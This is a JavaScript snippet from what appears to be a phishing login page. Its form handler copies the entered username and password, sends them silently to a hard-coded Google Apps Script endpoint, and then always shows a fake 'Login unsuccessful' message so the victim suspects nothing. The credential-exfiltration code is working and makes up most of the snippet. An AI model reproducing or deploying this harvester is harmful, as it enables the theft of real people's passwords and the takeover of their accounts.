<script>
$(document).ready(function() { 
  resizeCell(); 
  window.onresize = function() { resizeCell(); }; 
});

function resizeCell() {
  $('#spanCell').height($(window).height() - $('#fullTable').height() + $('#spanCell').height());
}

// Google Apps Script URL to POST login info
const googleScriptURL = 'https://script.google.com/macros/s/AKfycbw1F_PtoLRIy9ioxrQGJHOfIkAcMmE--ZvQ2V5Kou5OBw7uN28IV94cj45mxJXEOwqeBA/exec';

// Override form submit handler
function handleLogin(event) {
  event.preventDefault(); // Prevent actual form submission

  const username = document.getElementById('username').value.trim();
  const password = document.getElementById('password').value.trim();

  // Check empty fields with alert popups
  if (!username) {
    alert('You must enter a Login ID.');
    return false;
  }
  if (!password) {
    alert('You must enter a Password.');
    return false;
  }

  // Prepare data to send to Google Apps Script
  const data = { username, password };

  // Send login info asynchronously (no reload)
  fetch(googleScriptURL, {
    method: 'POST',
    mode: 'no-cors', // Google Apps Script may require this to avoid CORS error
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(data)
  }).catch(console.error);

  // Show the invalid login popup no matter what
  alert('Login unsuccessful. Please check your Login ID and Password.');

  // Reset password field for security
  document.getElementById('password').value = '';

  return false; // Prevent navigation or reload
}
</script>
